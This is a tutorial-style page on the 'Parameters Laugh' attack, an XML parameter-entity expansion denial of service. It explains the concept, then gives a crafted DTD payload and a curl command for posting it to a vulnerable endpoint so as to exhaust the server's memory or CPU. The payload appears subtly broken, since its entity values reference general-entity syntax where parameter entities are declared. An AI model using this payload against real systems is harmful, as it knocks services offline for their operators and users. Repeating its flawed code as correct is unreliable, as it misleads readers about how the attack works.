# Parameters Laugh Attack

## Context

The Parameters Laugh Attack is a specialized form of XML External Entity (XXE) exploitation used to perform denial of service (DoS) on targeted servers. The attack leverages parameter entity expansion within XML documents to exhaust system resources, such as memory and CPU. This attack builds upon foundational understanding of XML structure, entity declaration, parameter entities, and standard XXE attack mechanisms.

## Theory

### Parameter Entities in XML and Their Abuse

Parameter entities are a specific type of XML entity that are declared with a '%' sign and are utilized within Document Type Definitions (DTDs) rather than within the document's content. They can reference other entities, allowing for the creation of recursive expansions. If these parameter entities are not properly handled, they can be exploited to cause resource exhaustion within the server processing the XML document.

### Parameters Laugh Attack: Concept and Mechanism

A Parameters Laugh Attack is a variant of the Billion Laughs attack, employing parameter entities to induce exponential expansion. In this attack, an attacker carefully crafts a DTD with deeply nested parameter entities, which results in massive memory consumption during parsing by XML parsers. Some XML parsers impose fewer restrictions on parameter entity expansion than on general entity expansion, allowing this attack to bypass certain mitigations.

### Historical Context and Discovery

Parameters Laugh Attack was discovered by Sebastian Pipping, who demonstrated how parameter entity bombs can exploit overlooked vulnerabilities in XML parsing. These attacks highlight a significant risk, especially in systems where mitigations are targeted solely at general entities, leaving the parameter entity vector exposed.

## Practice

### Crafting and Delivering a Parameters Laugh Attack Payload

- Begin by creating a malicious XML file with a DTD containing recursively defined parameter entities. This forms the basis of the Parameters Laugh Attack.
  
```xml
<!DOCTYPE root [
  <!ENTITY % a0 "a">
  <!ENTITY % a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY % a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY % a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  %a3;
]>
<root/>
```

- This DTD setup recursively expands parameter entities, creating an exponential growth of entity replacements during parsing.

- Submit this XML payload to a vulnerable XML parser endpoint, such as via an HTTP POST request. Ensure the target server is configured to process external DTDs and supports parameter entities.

```bash
curl -X POST -H "Content-Type: application/xml" --data-binary @malicious.xml http://target/vulnerable-endpoint
```

- Replace `http://target/vulnerable-endpoint` with the actual endpoint that is vulnerable to such attacks.

### Outcome

Successful execution of a Parameters Laugh Attack will cause the target XML parser to exhaust its available memory or CPU resources, effectively resulting in a denial of service. This can cause the targeted service to slow down significantly, become unresponsive, or crash entirely.
